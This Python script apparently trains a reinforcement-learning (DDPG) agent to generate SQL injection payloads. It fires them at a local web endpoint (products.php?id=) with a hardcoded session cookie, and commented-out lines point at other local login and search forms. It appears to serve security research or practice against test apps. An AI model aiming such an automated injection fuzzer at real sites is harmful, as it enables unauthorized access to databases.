#!/usr/local/bin/python
import numpy as np
import requests
from model.initial_transitions_factory import InitialTransitionsFactory
from sql_parser.token_parser import TokenParser
from sql_parser.sql_data_service import SQLDataService
from model.token_embedder import TokenEmbedder 
from model.ddpg import DDPG
from model.environment import Environment

#
#
# !
# ! TODO: IMPORTANT: Add legal disclaimer.
# !
#
#

EMBEDDING_DIM = 32

ACTION_SIZE = 10

# TODO: Ensure states do not need to be larger than actions * length of embedding space.
#
# This is the case because an entire action is currently set as
# the prefix of a state.
STATE_SIZE = ACTION_SIZE * EMBEDDING_DIM + 500

IP = 'localhost'

# TODO: Ensure token parser checks for empty string instead of assuming
# its position at end of descending list.
#
# Must be an empty string due to token parsing in descending alphabetical
# order.
PADDING_TOKEN = ''

# Skips lowercase alphabet as SQL is case-insensitive.
visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
    [chr(i) for i in range(123, 127)]

data_service = SQLDataService()

columns = data_service.load_columns()
tables = data_service.load_tables()

sql_tokens = data_service.load_sql_tokens()
token_blacklist = data_service.load_sql_blacklist()

queries = data_service.load_wikisql_queries()
payloads = data_service.load_payload_files(IP)

dictionary = [PADDING_TOKEN] + sql_tokens + tables + columns + visible_uppercase_chars

# Remove duplicate characters. For example, visible_uppercase_chars might contain '(',
# which may also be contained in sql_tokens.
dictionary = list(set(dictionary))

dictionary.sort(reverse=True)

token_parser = TokenParser(dictionary, token_blacklist, tokens_per_row=ACTION_SIZE)

print('Encoding queries...')
encoded_queries = token_parser.parse(queries)
print(f'{len(encoded_queries)} queries encoded.')

print('Encoding payloads...')
encoded_payloads = token_parser.parse(payloads)
print(f'{len(encoded_payloads)} payload(s) encoded.')

# TODO: Retrieve cached embeddings (if already generated) if dictionary and
# embedding examples are unchanged.
print('Running token embedder...')
embeddings = TokenEmbedder(EMBEDDING_DIM).learn_embeddings(
    encoded_queries + encoded_payloads, len(dictionary))
print('Embeddings learned.')

environment = Environment(
    dictionary,
    action_size=ACTION_SIZE,
    state_size=STATE_SIZE,
    embeddings=embeddings,
    columns=columns,
    tables=tables,
    send_request_callback= lambda payload:
        requests.get(f'http://{IP}/products.php?id={payload}', headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'cookie': 'pma_lang=en; PHPSESSID=e938298172569f545c8b90e93ce98937; {flag}=795c7a7a5ec6b460ec00c5841019b9e9'
        }))
        #requests.post(f'http://localhost:3000/rest/product/search',data={'q': payload})
        #requests.post('http://localhost:3000/rest/user/login', data={
        #    'email': payload
        #})
        # requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}')
                                         
state: np.ndarray

def print_decoded_injections():
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

print_decoded_injections()

def main():    
    # The additional token placeholder counts as a termination token for the LSTM.
    dictionary_length = len(dictionary) + 1

    lstm_units = 20 + dictionary_length

    ddpg = DDPG(
        environment,
        demonstrations_factory=InitialTransitionsFactory(environment, encoded_payloads),
        lstm_units=lstm_units)

    ddpg.run(total_demonstration_steps=1000)

if __name__ == '__main__':
    main()